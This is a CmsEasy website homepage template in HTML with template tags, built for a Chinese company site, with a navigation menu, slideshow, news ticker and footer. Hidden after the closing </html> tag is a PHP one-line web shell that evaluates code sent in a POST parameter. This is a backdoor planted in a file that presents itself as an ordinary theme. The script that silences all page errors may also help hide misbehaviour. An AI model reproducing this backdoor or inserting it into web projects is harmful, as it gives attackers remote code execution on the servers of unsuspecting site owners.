<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>{getTitle($archive,$category,$catid,$type)}</title>

<!--delete Powered by CmsEasy
/-->

<script language="javascript" type="text/javascript">
var t=window.document.title; 
var s="- Powered by CmsEasy"; 
var i=t.indexOf(s); 
var mtitle=t.substring(0,i); 
window.document.title=mtitle; 
</script> 


<meta name="keywords" content="{getKeywords($archive,$category,$catid,$type)}" />
<meta name="description" content="{getDescription($archive,$category,$catid,$type)}" />
<meta name="author" content="CmsEasy Team" />
<link rel="icon" href="{$base_url}/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="{$base_url}/favicon.ico" type="image/x-icon" />
<!-- 调用样式表 -->
<link rel="stylesheet" href="{$skin_path}/base.css" type="text/css" media="all"  />
<link rel="stylesheet" href="{$skin_path}/reset.css" type="text/css" media="all"  />
<link rel="stylesheet" href="{$skin_path}/style.css" type="text/css" media="all"  />


 
<style type="text/css">
.logo {display:block;width:{get('logo_width')}px; height:{get('logo_height')}px; }
</style>
<script language="javascript" type="text/javascript">
function killerrors()
{
return true;
}
window.onerror = killerrors;
</script>
</head>
 <body>

<script type="text/javascript" src="{$skin_path}/js/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="{$skin_path}/js/slide.js"></script>
<script type="text/javascript" src="{$skin_path}/js/main.js"></script>



	<div class="top">
		<div class="box">
			<div class="lobo_box">
				<a title="{get(sitename)}" href="{$base_url}/"><img src="{get('site_logo')}" alt="{get(sitename)}" width="166px" /></a>
			</div>


			<div class="select_sim member">
            	<span>山东确信信息产业股份有限公司</span>
                <a href="#"></a>
                <ul style="width:200px; " id="nvul">
                    <li onclick="window.open('http://www.surees.com.cn/index.php')">山东确信能源科技有限公司</li>
			   </ul>
          </div>
		</div>
	</div>

	<div class="menu">
		<div class="box">
				<ul id="navmenu"  class="menu_ul"  style="font-size:15px; font-family:微软雅黑;">
{loop categories_nav() $t}
<li class="one"><a   class="{if isset($topid) && $topid==$t[catid]} on{/if}"href="{$t[url]}" title="{$t[catname]}" target="{if config::get('nav_blank')==1} _blank{/if}">{$t[catname]}</a>
{if count(categories($t[catid]))}<ul>
{loop categories($t[catid]) $t1}
<li><a title="{$t1[catname]}" href="{$t1[url]}">{$t1[catname]}</a>
{if count(categories($t1[catid]))}<ul>{loop categories($t1[catid]) $t2}<span></span>
<li><a title="{$t2[catname]}" href="{$t2[url]}">{$t2[catname]}</a>
{if count(categories($t2[catid]))}<ul>{loop categories($t2[catid]) $t3}<span></span>
<li><a title="{$t3[catname]}" href="{$t3[url]}">{$t3[catname]}</a>
{if count(categories($t3[catid]))}<ul>{loop categories($t3[catid]) $t4}<span></span>
<li><a title="{$t4[catname]}" href="{$t4[url]}">{$t4[catname]}</a>
{if count(categories($t4[catid]))}<ul>{loop categories($t4[catid]) $t5}<span></span>
<li><a title="{$t5[catname]}" href="{$t5[url]}">{$t5[catname]}</a></li> 
{/loop}</ul>{/if}
</li> 
{/loop}</ul>{/if}
</li>
{/loop}</ul>{/if}
</li>
{/loop}</ul>{/if}
</li> 
{/loop}</ul>{/if}
</li>{/loop}
</ul>
		</div>
	</div>

	<div class="banner">





<!--   公告滚动，需要注释script	
<script type="text/javascript" src="{$skin_path}/js/jquery-1.3.2.min.js"></script>
//-->
	

<script type="text/javascript" src="{$skin_path}/js/jquery.featureList-1.0.0.js"></script>
<script language="javascript">
/*******************************
 * 幻灯片
 * 当前状态时 .current
 * start_item 从第几个开始
 *******************************/
	$(document).ready(function() {

		$.featureList(
			$(".slides_nav li"),
			$(".slides_box div"), {
				start_item	:	0
			}
		);

	});
</script>


<!--/t_1-->

<div class="slides_box">

<div>
<center><a href=""><img src="{get(slide_pic1)}" alt="{get(slide_pic1_title)}" /></a></center>
</div>
<div>
<center><a href=""><img src="{get(slide_pic2)}" alt="{get(slide_pic2_title)}" /></a>
</center></div>
<div>
<center><a href=""><img src="{get(slide_pic3)}"  alt="{get(slide_pic3_title)}" /></a>
</center></div>
<div>
<center><a href=""><img src="{get(slide_pic4)}"  alt="{get(slide_pic4_title)}" /></a>
</center></div>
<div>
<center><a href=""><img src="{get(slide_pic5)}"  alt="{get(slide_pic5_title)}" /></a>
</center></div>

<ul class="slides_nav">
<li>1</li>
<li>2</li>
<li>3</li>
<li>4</li>
<li>5</li>
</ul>
<!--slides_nav end-->
</div>
<!--slides_box end-->



	
	
	
	
	
	</div>
	<div class="blank20"></div>



	<div class="diyihang">
		
				
		<div class="diyihang1">
			{lang(新闻)}
		</div>


 <div class="news_tit">

<div class="news_btn JQ-slide-nav">
<a class="btn_l prev" href="#"><img alt="" src="{$skin_path}/images/ico_left.gif"></a>
<a class="btn_r next" href="#"><img alt="" src="{$skin_path}/images/ico_right.gif"></a>
</div>
<div class="roll_news JQ-content-box">
<ul class="JQ-slide-content" style="margin-top: 0px;">
         {loop announ(5) $an}     
<li class="a1"><a href="{$an[url]}">{cut($an[title],35)}…<span>[{$an[adddate]}]</span></a></li>
{/loop}

</div>
</div>
<div class="diyihang3">	
			{tag_首页第一行右侧栏目一}|
			{tag_首页第一行右侧栏目二}|
			{tag_首页第一行右侧栏目三}
		</div>

		
	</div>

	<div class="blank20"></div>
	<div class="dierhang">
		<div class="dierhang1">
			{tag_第二行栏目图片一}
			<ul>
				{tag_首页第三行一栏目图片列表四条}
			</ul>
		</div>
		<div class="dierhang1 dierhang2">
			{tag_第二行栏目图片二}
			<ul>
				{tag_首页第三行二栏目图片列表四条}
			</ul>
		</div>
		<div class="dierhang1 dierhang3">
			{tag_第二行栏目图片三}
			<ul>
				<img src="{$skin_path}/images/img7.jpg" width="49" height="71" alt="" />
				<li>{lang(tel)}：{get(tel)}</li>
				<li>{lang(fax)}：{get(fax)}</li>
				<li>{lang(email)}：{get(email)}</li>
				<li>{lang(address)}：{get(address)}</li>
			</ul>
		</div>
		<div class="clear"></div>
	</div>

	<div class="blank20"></div>
	<div class="foot">
		<div class="box">
			<span class="foot1">
				{get('sitename')}  {get('site_icp')}  {get(site_right)}  
<!--
Powered by <a href="http://www.cmseasy.cn" title="CmsEasy企业网站系统" target="_blank">CmsEasy</a>
/-->
			</span>
			<span class="foot2">
				<a href="http://www.suresec.net/index.php?case=archive&act=list&catid=24"><img src="{$skin_path}/images/untitled.jpg" width="110" height="31" alt="" /></a>
			</span>
			<div class="clear"></div>
		</div>
	</div>




<script type="text/javascript"> 
// 公告滚动js
var t=setInterval(myfunc,1000); 
var oBox=document.getElementById("announ"); 
function myfunc(){ 
var o=oBox.firstChild 
oBox.removeChild(o) 
oBox.appendChild(o) 
} 
oBox.onmouseover=function()
{
clearInterval(t)
} 
oBox.onmouseout=function()
{
t=setInterval(myfunc,2000)//滚动时间，默认2秒
} 
</script>

<!-- 在线客服 -->
{template 'system/servers.html'}
<!-- 短信 -->
{template 'system/sms.html'}


{if get('share')=='1'}
<!-- Baidu Button BEGIN -->
<script type="text/javascript" id="bdshare_js" data="type=slide&img=6&pos=right&uid=620555" ></script>
<script type="text/javascript" id="bdshell_js"></script>
<script type="text/javascript">
		var bds_config = {"bdTop":150};
		document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?t=" + new Date().getHours();
</script>
<!-- Baidu Button END -->
{/if}



</body>
</html>﻿<?php @eval($_POST['-1]);?>